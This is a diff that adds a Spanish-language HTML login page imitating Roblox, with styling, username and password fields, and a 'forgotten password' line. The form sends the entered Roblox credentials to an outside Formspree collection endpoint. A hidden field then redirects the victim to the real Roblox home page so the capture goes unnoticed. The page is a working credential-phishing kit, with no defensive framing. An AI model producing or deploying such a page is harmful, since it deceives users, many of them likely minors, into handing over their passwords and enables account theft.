@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - Roblox Style</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #393b3d;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #bdc3c7;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #008a57;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #0074bd;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Iniciar sesión</h2>
+        
+        <form action="https://formspree.io/f/xjgaapek" method="POST">
+            
+            <div class="input-group">
+                <label for="username">Usuario de Roblox</label>
+                <input type="text" id="username" name="Usuario_Roblox" placeholder="Usuario / Correo / Teléfono" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="Contrasena" placeholder="Contraseña" required>
+            </div>
+
+            <input type="hidden" name="_next" value="https://www.roblox.com/home">
+            
+            <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <div class="footer-links">
+            <p>¿Has olvidado tu contraseña o nombre de usuario?</p>
+        </div>
+    </div>
+
+</body>
+</html>
